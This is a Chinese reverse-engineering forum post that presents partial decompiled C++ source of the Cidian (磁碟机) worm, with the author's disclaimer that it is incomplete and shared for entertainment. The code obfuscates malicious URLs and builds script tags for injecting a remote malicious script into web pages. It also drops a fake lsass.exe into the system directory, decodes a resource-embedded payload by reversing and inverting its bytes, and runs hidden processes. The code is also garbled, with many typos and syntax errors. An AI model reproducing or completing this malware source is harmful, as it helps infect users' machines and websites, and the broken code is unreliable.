

# 逆的一部分磁碟机代码

> 原文：[`www.pediy.com/kssd/pediy10/71640.html`](https://www.pediy.com/kssd/pediy10/71640.html)

1."一部分"是指很无用处的一部分(大家可以具体看代码).  
2.代码里边有不少的错误,以及缺失,大家只可当娱乐.  
2.放出来只为娱乐或者虚荣,不为技术.因为这里边没有什么技术.  
3.不要用于非法用途.  
代码如下:

代码:

```
//complaint for NewNote1.
char OrgPath\[256\];//seems 6d0?
char aHttp\[\]="http:////";
char aMsctfime\[\]="MSCTFIME ";
char aSmss\[\]="SMSS";
char aMci\[\]="MCI";
char aProgram\[\]=" Program";
char aCom\[\]=" Com";
char aApplication\[\]=" Application";//? maybe now array just constant.

char\* pNull=NULL;//40e110

CString strWindowName;//?char buffer 
CString strWebSite1;
CString strWebSite2;
CString strNewLsaPath;

char aNewLsaPath\[255\];

class CVirDlg:public CDialog
{
public:
    CString m\_strWebSite2;//\[esi+A8C\]
    CString m\_strWebSite3;//\[esi+A98\]
    CString m\_strTemp1;//\[esi+A74\]
    CString m\_strScript1;//\[esi+A59\]
    CString m\_strScript11;//\[esi+A5D\]
    CString m\_strExe;//\[esi+A49\]
    CString m\_strLsass;//\[esi+A4D\]
    CString m\_strSmss;//\[esi+A51\]
    CString m\_strTemp2;//\[esi+A2C\]
    DWORD m\_dwTemp;//\[esi+60\]
    char m\_ModuleName\[0x68\];//\[esi+68\]
    DOWRD m\_dwTemp1;//\[esi+A30\]
    CString m\_strCmdLine;//\[esi+A45\]
    
    
    }
BOOL CVirDlg::OnInitDialog()
{
    SetPriorityClass(GetCurrentProcess(),IDLE\_PRIORITY\_CLASS);
    
    CoInitialize(NULL);
    
    CString strTemp;
    char aEspPifName\[256\];//ebp-9dc
    
    
    srand((unsigned)time(NULL));
    
    CDialog::OnInitDialog();//here invoke the baseclass memeber function.
    SendMessage(m\_hWnd,WM\_SETICON,ICON\_BIG,m\_hIcon);//SetIcon(m\_hIcon,TRUE)
    SendMessage(m\_hWnd,WM\_SETICON,ICON\_SMALL,m\_hIcon);//SetIcon(m\_hIcon,FALSE) .m\_hIcon is a handle of CVirDlg.
    
    strcpy(OrgPath,\*\_\_p\_\_agrv());
    
    strTemp.Format("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",'w','.','c','0','m','o','.','c','o','m','//','r','.','h','t','m');
    strTemp=aHttp+strTemp;
    strWebSite1=strTemp;
    
    strTemp.Format("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",'j','s','.','k','0','1','0','2','.','c','o','m','//','a'\\
        'd','.','a','s','p','.','h','t','m');
    strTemp=aHttp+strTemp;
    strWebSite2=strTemp;
    
    m\_strWebSite2=strTemp;
    
    strTemp.Format("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",'j','s','.','k','0','1','0','2','.','c','o','m','/','g','o',\\
        '.','a','s','p','.','a','d','.','a','s','p');
    strTemp=aHttp+strTemp;
    m\_strWebSite3=strTemp;
    
    strWindowName=aMsctfime;
    strWindowName+=aSmss;
    
    m\_strTemp1=NULL;
    
    strTemp=aMci;
    strTemp+=aProgram;
    strTemp+=aCom;
    strTemp+=aApplication;
    
    if(CWnd::FromHandle(FindWindow("XOR",strWindowName)))
    {
        DWORD dwPid1=0;
        GetWindowThreadProcessId(FindWindowEx(0,0,"XOR",strWindowName),&dwPid1);
        
        DWORD dwPid2=0;
        GetWindowThreadProcessId(FindWindowEx(0,0,"#32770",strTemp),&dwPid2);
        
        int dwTimes=0;
        do
        {
            if(FindWindow("XOR",strWindowName))
            {
                HANDLE hVirProc;
                if(hVirProc=OpenProcess(PROCESS\_ALL\_ACCESS,0,dwPid1)
                    Terminate(hVirProc);
                else
                    CloseHandle(hVirProc);
                if(hVirProc=OpenProcess(PROCESS\_ALL\_ACCESS,0,dwPid2)
                    Terminate(hVirProc);
                else
                    CloseHandle(hVirProc);
            }
        }while(++dwTimes!=5)    //?why terminate the vir proc 
        
        strWindowName="http:\\/\\/%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D\\/%30%31%2E%61%73%70";
        strTemp="<script src=\\\\""+strWindowName+"\\"><\\/script>";
        m\_strScript1=strTemp;
        
        strTemp="<ScRiPt src=\\'"+strWindowName+"\\'><\\/sCrIpT>";
        m\_strScript11=strTemp;
        
        strTemp.Format("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",'M','C','I',' ','P','r',\\
            'o','g','r','a','m',' ','C','o','m',' ','A','p','p','l','i','c','a','t','i','o','n');
        strWindowName=strTemp;//40d924.
        
        strTemp.Format("%c%c%c%c",'~','.','e','x','e');
        m\_strExe=strTemp;
        
        strTemp.Format("%c%c%c%c%c%c%c%c%c",'l','s','a','s','s','.','e','x','e');
        m\_strLsass=strTemp;
        
        strTemp.Format("%c%c%c%c%c%c%c%",'s','m','s','s','.','e','x','e');
        m\_strSmss=strTemp;
        
        SetWindowText(strWindowName);
        
        m\_strTemp2=pNull;
        m\_dwTemp=0;
        m\_dwTemp1=0;
        
        GetModuleFileName(NULL,&m\_ModuleName,0x9c4);//ModuleName is the full path name.
        
        \_stat stInfo;
        \_stat(&m\_ModuleName,&stInfo);//get module startup information.
        
        char aSysDir\[255\];
        GetSystemDirectory(aSysDir,255);
        
        strNewLsaPath.Format("%s\\\\com",aSysDir);
        strNewLsaPath.Format("%s%s",strNewFilePath,m\_strLsass);
        
        strcpy(aNewLsaPath,strNewLsaPath);
        
        CString strOrgPath=OrgPath;
        strOrgPath.MakeLower();
        
        m\_strCmdLine=GetCommandLine();//include "" semilicon.
        m\_strCmdLine.MakeLower();
        
        if((int nPos=m\_strCmdLine.Find("\\""))!=-1)
        {
            m\_strCmdLine+=" ";
            m\_strCmdLine=m\_strCmdLine.Mid(m\_strCmdLine.Find("\\"",++nPos)+1);//blank space?
            CString strMutex=strOrgPath+m\_strCmdLine;//add one blank space.
            strMutex.Replace("\\\\"," ");
            strMutex.Replace(":"," ");
            strMutex.Replace("."," ");
            
            HANDLE hMutex=CreateMutex(NULL,TURE,strMutex);
            if(GetLastError()=ERROR\_ALREADY\_EXIST)
                exit(0);
                
            int nTimes=0;
            
            if(\_mbscmp(" ^",m\_strCmdLine.Left(2))!=-1)  //code page.a lot of other things.
            {   SetFileAttributes(m\_strCmdLine.Mid(2),HIDDEN|SYSTEM);//?
                    
                do
                {   if(DeleteFile(m\_strCmdLine.Mid(2))!=-1)
                        Sleep(60);
                    else
                        eixt(0);
                }while(++nTimes<30);
                
                exit(0);
            }   
            
            if(strOrgPath.Find("pagefile.pif")!=-1)    //strOrgPath ebp-2c
            {
                CString strRootFile=strOrgPath.Left(3);
                strRootFile=strRootFile+"pagefile.exe";//strRootFile ebp-20
                
                ThrowVirus(strRootFile,0xc1,"sexp");//throw out the new virus file.
                
                SetFileAttributes(strRootFile,HIDDEN|SYSTEM);
                WinExec(strRootFile,SW\_HIDE);//pagefile.exe---invoke the COM component.
                
                fun(strRootFile);

```

代码:

```
CVirDlg::fun(CString strFileName)
{

    CString strEspFileName;
    strEspFileName=" ^"+strFileName;
    strcpy(aEspPifName,strEspFileName);
    CreateProc(aNewLsaPath,aEspPifName,1,0,0);
    
    }
int CVirDlg::CreateProc(char \*lpApplicationName,LPSTR lpCommandLine,int var1,int var2,int var3)
{
    STARTUPINFO stinfo;
    memeset(stinfo,0,sizeof(stinfo));
    stinfo.size=sizeof(STATUPINFO);
    if(var3==0)
    {
        stinfo.dwFlags=STARTF\_USESHOWWINDOW;
        stinfo.wShowWindow=FALSE;
    }
  
    PROCESS\_INFOMATION pInfo;
    if(!CreateProcess(lpApplication,lpCommandLine,NULL,NULL,FALSE,IDLE\_PRIORITY\_CLASS,NULL,NULL,&stinfo,&pInfo))
        return(2008);
    if(var1==0)
    {
           }
    
    
    }

```

代码:  

代码:

```
ThrowVirus(LPSTR aFilePath,CString& sResType,int nResID)
{
    if(HRSRC hResInfo=FindResource(NULL,nResID,sResType))
    {
        int nSize=SizeOfResource(NULL,hResInfo);
        if(HGLOBAL hRes=LoadResource(NULL,hResInfo))
        {
            if(nResID=::CreateFile(aFilePath,GENERIC\_WRITE,0,NULL,CREATE\_ALWAYS,0,NULL))
            //pay attention to sharemode 0 only use by owner cannot shared.
            //file attribute 0 not a right value transfer to normal.
            {
                char\* pBuf1,pBuf2;
                if!(pBuf1=malloc(nSize)&&pBuf2=malloc(nSize))
                {
                    if(memcpy(pBuf2,LockResource(hRes),nSize)>0)
                    {
                        pBuf2=pBuf2+nSize-1;
                        char \*temp1=pBuf1,\*temp2=pBuf2;
                        while(--nSize) 
                            \*pBuf1++=\*pBuf2--;    
                        pBuf1=temp1;pBuf2=temp2;
                        if(\*pBuf1==0x0d)
                        {
                            int i=1;
                            if(nSize>i)
                            {   
                                while(i++<nSize)
                                    \*pBuf1=~(\*pBuf1);
                                
                                int BytesWritten=0;                      
                                WriteFile(nResID,pBuf1,nSize-1,&BytesWritten,NULL);
                                free(pBuf1);
                                CloseHandle(nResID);                                                 
                            }                                    
                        }
                        
                        //to be added:write file;error file size         
                    }
                    else
                    {    //ErorrMemSize
                    }
                    
                }
                
            }
        }
        
    }
    
}

```